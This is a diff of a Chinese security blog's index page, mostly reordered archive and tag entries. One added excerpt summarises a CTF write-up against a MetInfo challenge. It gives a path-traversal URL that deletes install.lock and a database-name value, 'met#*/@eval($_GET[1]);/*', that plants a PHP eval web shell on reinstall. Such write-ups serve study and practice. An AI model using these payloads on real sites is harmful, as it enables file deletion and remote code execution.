@@ -354,6 +354,45 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/posts/46785/">
+            
+                <span>巅峰极客ctf</span>
+        </a>
+        <div class="abstract-content">
+            pentest御剑扫描
+经过目录扫描，发现file/file.php
+根据网页最后提示:
+12DELETE FILESorry,no filename!
+可以猜测存在任意文件删除漏洞。
+首先我们删除install.lock
+1http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock
+重装metinfo，重装的时候数据库名填写 
+1met#*/@eval($_GET[1]);/*
+数据库密码为root
+执行shel...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/23</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/posts/5109/">
             
                 <span>php-命令执行</span>
@@ -660,35 +699,6 @@ man命令允许执行命令
                 <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/24</span>
             </div>
             <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/32268/">
-            
-                <span>sctf2018</span>
-        </a>
-        <div class="abstract-content">
-            <h2 id="新的建议板"><a href="#新的建议板" class="headerlink" title="新的建议板"></a>新的建议板</h2>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
-    
-</div>
             
         </div>
     </article>
@@ -1660,22 +1670,9 @@ man命令允许执行命令
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 54
+        Total : 55
         </div>
         <!-- search  -->
         
@@ -1688,6 +1685,11 @@ man命令允许执行命令
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/61088/">php-项目结构</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1876,12 +1878,12 @@ man命令允许执行命令
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
@@ -1964,9 +1966,9 @@ man命令允许执行命令
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
-    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
@@ -1979,6 +1981,8 @@ man命令允许执行命令
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
